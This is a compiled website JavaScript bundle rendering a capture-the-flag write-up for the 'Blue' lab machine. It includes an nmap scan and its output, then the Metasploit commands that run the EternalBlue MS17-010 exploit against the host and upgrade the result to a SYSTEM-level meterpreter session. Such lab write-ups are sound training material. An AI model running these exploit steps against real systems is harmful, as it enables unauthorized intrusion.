(window.webpackJsonp=window.webpackJsonp||[]).push([[70],{379:function(s,t,e){"use strict";e.r(t);var n=e(8),a=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"blue"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#blue"}},[s._v("#")]),s._v(" Blue")]),s._v(" "),t("p",[s._v("IP: "),t("code",[s._v("10.10.10.40")])]),s._v(" "),t("h2",{attrs:{id:"initial-scan"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#initial-scan"}},[s._v("#")]),s._v(" Initial scan")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T5")]),s._v(" -p- "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.40\n")])])]),t("p",[s._v("Result")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 00:53 EDT\nStats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan\nNSE Timing: About 0.00% done\nWarning: 10.10.10.40 giving up on port because retransmission cap hit (2).\nNmap scan report for 10.10.10.40\nHost is up (0.073s latency).\nNot shown: 65526 closed ports\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nAggressive OS guesses: Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%), Microsoft Windows 8.1 (96%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1m16s, deviation: 0s, median: 1m15s\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2020-03-16T05:03:42+00:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2020-03-16T05:03:45\n|_  start_date: 2020-03-16T04:54:16\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT      ADDRESS\n1   72.60 ms 10.10.14.1\n2   72.70 ms 10.10.10.40\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 535.49 seconds\n")])])]),t("h2",{attrs:{id:"attack-plan"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#attack-plan"}},[s._v("#")]),s._v(" Attack plan")]),s._v(" "),t("ol",[t("li",[s._v("First try the microsoft-ds port "),t("code",[s._v("445")])]),s._v(" "),t("li",[s._v("Try ports "),t("code",[s._v("135")]),s._v(" or "),t("code",[s._v("139")])]),s._v(" "),t("li",[s._v("Go for the high numbered ports")])]),s._v(" "),t("h2",{attrs:{id:"eternal-blue-ms17-010"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#eternal-blue-ms17-010"}},[s._v("#")]),s._v(" Eternal-blue MS17-010")]),s._v(" "),t("p",[s._v("For this, we are attacking port 445")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfconsole\nmsf "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/windows/smb/ms17_010_eternalblue\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms17_010_eternalblue"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" show targets\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms17_010_eternalblue"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" TARGET "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms17_010_eternalblue"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" show options\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms17_010_eternalblue"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhosts "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.40\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms17_010_eternalblue"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit\n")])])]),t("p",[s._v("And it worked!")]),s._v(" "),t("p",[s._v("Now let's upgrade the session to a meterpreter session")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("background\nupgrade sessions "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# a merterpreter shell was created on session 2")]),s._v("\n\nsesions "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("\n")])])]),t("p",[s._v("Let's wee who I am")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("getuid\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# NT AUTHORITY\\SYSTEM")]),s._v("\n")])])]),t("h2",{attrs:{id:"takeaways"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#takeaways"}},[s._v("#")]),s._v(" Takeaways")]),s._v(" "),t("ul",[t("li",[s._v("Sometimes the machine name gives away a lot. In this instance, the machine's name was blue and the exploit was named eternal blue!")])])])}),[],!1,null,null,null);t.default=a.exports}}]);